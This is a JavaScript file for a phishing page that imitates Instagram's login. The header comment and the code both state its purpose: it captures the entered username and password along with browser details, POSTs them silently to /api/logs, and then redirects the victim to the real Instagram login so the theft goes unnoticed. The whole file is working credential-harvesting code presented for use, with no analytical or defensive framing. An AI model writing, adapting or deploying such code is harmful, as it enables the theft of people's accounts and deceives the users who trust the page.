// lang: JS, file: public/app.js, target: browser (login page)
// Enables login button when both fields have content, POSTs creds to /api/logs,
// then redirects to real Instagram.

(function () {
  const form = document.getElementById('loginForm');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');
  const btn  = document.getElementById('loginBtn');

  function sync() {
    btn.disabled = !(user.value.trim().length > 0 && pass.value.length > 0);
  }
  user.addEventListener('input', sync);
  pass.addEventListener('input', sync);

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    if (btn.disabled) return;

    const payload = {
      username: user.value,
      password: pass.value,
      ts: new Date().toISOString(),
      ua: navigator.userAgent,
      ref: document.referrer || '',
      lang: navigator.language || '',
    };

    try {
      fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      }).catch(function () {});
    } catch (_) {}

    setTimeout(function () {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 250);
  });
})();
